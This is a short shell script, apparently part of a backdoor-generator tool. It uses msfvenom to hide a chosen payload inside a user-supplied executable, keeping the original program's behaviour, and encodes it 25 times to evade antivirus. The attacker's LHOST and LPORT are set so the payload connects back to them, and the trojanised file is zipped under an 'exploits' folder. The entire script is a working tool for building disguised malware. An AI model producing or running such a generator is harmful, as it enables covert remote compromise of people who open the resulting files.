echo "[Wait] While I generate your bacdoor ($2)......."
msfvenom -p $1 -f exe -e x86/shikata_ga_nai -i 25 -k -x upload/$2 LHOST=$3 LPORT=$4 >veeru.exe
mv veeru.exe exploits/$2
chmod +x exploits/$2
echo ""
zip exploits/$2.zip exploits/$2
rm -r upload/
